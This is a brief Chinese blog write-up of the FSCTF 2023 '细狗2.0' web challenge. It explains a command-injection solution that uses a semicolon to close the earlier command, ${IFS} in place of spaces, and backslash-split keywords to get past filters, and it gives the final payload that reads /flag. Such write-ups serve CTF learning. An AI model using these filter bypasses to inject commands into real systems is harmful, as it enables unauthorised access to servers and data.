# 【FSCTF 2023】细狗2.0


# [FSCTF 2023]细狗2.0

## 思路
* 输入点东西

  * sql注入：排除
  
  * ssti：排除
  
  * rce：本来我是排除了，但是看大佬的wp说前面加分号做闭合就可以rce
  
    &gt; 咱就是说完全不知道要这样子闭合，果然还要修炼😥
  
* RCE

  * 一个是空格过滤：我用了`${IFS}`
  * 一个是cat、flag过滤：有好几种方法的。我用了反斜杠绕过`c\at${IFS}/f\lag`



## RCE

```
?hongzh0=%3Bc\at${IFS}/f\lag
```

## 总结

* RCE
* 绕过过滤
* 截断

---

> Author: [Ting](Tin10g.github.io)  
> URL: https://Tin10g.github.io/posts/2024%E5%81%9A%E9%A2%98-fsctf-2023%E7%BB%86%E7%8B%972.0/  

